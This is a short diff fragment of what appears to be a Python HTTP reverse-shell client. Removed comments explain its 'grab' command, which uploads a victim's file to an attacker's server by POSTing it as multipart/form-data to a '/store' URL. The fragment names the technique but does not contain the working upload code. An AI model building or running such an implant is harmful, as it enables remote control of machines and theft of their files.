@@ -16,15 +16,6 @@ while True:
         break # end the loop
 
 
-# Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we 
-# notify our attacker that we are unable to find the file, but if the file is there then we will :-
-# 1.Append /store in the URL
-# 2.Add a dictionary key called 'file'
-# 3.requests library use POST method called "multipart/form-data" when submitting files
-
-#All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output
-#Please see the server script for more details on how we can use these points to get the file
-
 
     elif 'grab' in command:
         
